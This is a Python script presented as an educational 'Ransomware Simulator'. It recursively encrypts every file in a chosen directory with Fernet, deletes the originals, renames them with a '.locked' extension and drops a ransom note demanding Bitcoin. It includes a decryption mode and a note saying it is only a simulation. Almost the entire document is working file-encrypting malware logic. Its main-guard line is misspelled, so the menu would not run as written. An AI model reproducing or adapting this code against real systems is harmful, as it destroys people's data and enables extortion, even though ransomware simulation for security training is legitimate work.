import os
from cryptography.fernet import Fernet

# --- Configuration ---
TARGET_DIRECTORY = "C:\\RansomTest"  # IMPORTANT: Change this to your VM's test directory
ENCRYPTED_EXTENSION = ".locked"     # Extension for encrypted files
RANSOM_NOTE_FILENAME = "READ_ME_NOW.txt"

# --- Encryption Key Management ---
# For a simulator, you can generate a key and save it or hardcode it for simplicity.
# In a real scenario, this key would be securely managed.
def generate_key():
    key = Fernet.generate_key()
    with open("secret.key", "wb") as key_file:
        key_file.write(key)
    return key

def load_key():
    try:
        return open("secret.key", "rb").read()
    except FileNotFoundError:
        print("Key file 'secret.key' not found. Please generate a key first.")
        return None

# --- File Operations ---
def find_target_files(directory):
    target_files = []
    for root, _, files in os.walk(directory):
        for file in files:
            if not file.endswith(ENCRYPTED_EXTENSION) and file != RANSOM_NOTE_FILENAME and file != "secret.key":
                target_files.append(os.path.join(root, file))
    return target_files

def encrypt_file(file_path, fernet):
    try:
        with open(file_path, "rb") as file:
            original_data = file.read()
        encrypted_data = fernet.encrypt(original_data)
        with open(file_path + ENCRYPTED_EXTENSION, "wb") as encrypted_file:
            encrypted_file.write(encrypted_data)
        os.remove(file_path) # Delete original file
        print(f"Encrypted: {file_path}")
    except Exception as e:
        print(f"Error encrypting {file_path}: {e}")

def decrypt_file(file_path, fernet):
    try:
        with open(file_path, "rb") as file:
            encrypted_data = file.read()
        decrypted_data = fernet.decrypt(encrypted_data)
        original_file_path = file_path.replace(ENCRYPTED_EXTENSION, "")
        with open(original_file_path, "wb") as original_file:
            original_file.write(decrypted_data)
        os.remove(file_path) # Delete encrypted file
        print(f"Decrypted: {file_path}")
    except Exception as e:
        print(f"Error decrypting {file_path}: {e}")

# --- Ransom Note ---
def create_ransom_note():
    note_path = os.path.join(TARGET_DIRECTORY, RANSOM_NOTE_FILENAME)
    ransom_message = """
    !!! YOUR FILES ARE ENCRYPTED !!!

    All your important files (documents, photos, videos, etc.) have been encrypted
    with a strong encryption algorithm. Without the decryption key, they are inaccessible.

    To recover your files, you need to pay X amount of Bitcoin to this address:
    [SIMULATED_BITCOIN_ADDRESS]

    Once payment is confirmed, we will provide you with the decryption tool.
    DO NOT try to decrypt your files yourself or use third-party tools,
    it may lead to permanent data loss.

    This is a simulation to test your security. No actual payment is required.
    """
    with open(note_path, "w") as note_file:
        note_file.write(ransom_message)
    print(f"\n--- Ransom Note Created at: {note_path} ---")
    # Optional: Open the note automatically (might require specific OS commands)
    # import subprocess
    # subprocess.Popen(['notepad.exe', note_path]) # For Windows

# --- Main Logic ---
def run_encryption_simulation():
    key = load_key()
    if not key:
        print("Please generate a key first using option 'g'.")
        return

    fernet = Fernet(key)
    files_to_encrypt = find_target_files(TARGET_DIRECTORY)

    if not files_to_encrypt:
        print(f"No files found in {TARGET_DIRECTORY} to encrypt.")
        return

    print(f"Encrypting {len(files_to_encrypt)} files in {TARGET_DIRECTORY}...")
    for file_path in files_to_encrypt:
        encrypt_file(file_path, fernet)
    create_ransom_note()
    print("\n--- Encryption Simulation Complete ---")

def run_decryption_simulation():
    key = load_key()
    if not key:
        print("Key not found. Cannot decrypt.")
        return

    fernet = Fernet(key)
    
    # Find encrypted files
    encrypted_files = []
    for root, _, files in os.walk(TARGET_DIRECTORY):
        for file in files:
            if file.endswith(ENCRYPTED_EXTENSION):
                encrypted_files.append(os.path.join(root, file))

    if not encrypted_files:
        print(f"No encrypted files found in {TARGET_DIRECTORY}.")
        return

    print(f"Decrypting {len(encrypted_files)} files in {TARGET_DIRECTORY}...")
    for file_path in encrypted_files:
        decrypt_file(file_path, fernet)
    
    # Remove the ransom note
    note_path = os.path.join(TARGET_DIRECTORY, RANSOM_NOTE_FILENAME)
    if os.path.exists(note_path):
        os.remove(note_path)
        print("Ransom note removed.")
    
    print("\n--- Decryption Simulation Complete ---")


if _name_ == "_main_":
    print("Ransomware Simulator - Educational Tool")
    print("---------------------------------------")
    print(f"Targeting directory: {TARGET_DIRECTORY}")
    print("Make sure you are running this inside a Virtual Machine!")

    while True:
        print("\nChoose an option:")
        print("g - Generate new encryption key (creates secret.key)")
        print("e - Run encryption simulation")
        print("d - Run decryption simulation")
        print("q - Quit")

        choice = input("Enter your choice: ").lower()

        if choice == 'g':
            generated_key = generate_key()
            if generated_key:
                print(f"Encryption key generated and saved to secret.key")
        elif choice == 'e':
            run_encryption_simulation()
        elif choice == 'd':
            run_decryption_simulation()
        elif choice == 'q':
            print("Exiting simulator. Stay secure!")
            break
        else:
            print("Invalid choice. Please try again.")ṇ